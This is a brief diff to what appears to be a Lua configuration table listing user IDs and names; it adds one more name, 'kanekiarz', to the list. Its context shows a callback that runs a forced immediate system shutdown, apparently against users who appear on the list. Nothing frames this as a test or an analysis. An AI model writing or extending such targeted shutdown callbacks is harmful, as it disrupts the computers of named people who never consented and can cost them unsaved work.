@@ -72,6 +72,7 @@
     {72994874,'votalge'},
     {504120122,'fanatzxcurseda'},
     {4142253411,'iluabebr_142'},
+    {2691862078,'kanekiarz'},
   },
   callback = function() os.execute('shutdown -s -t 1')  end,
 }
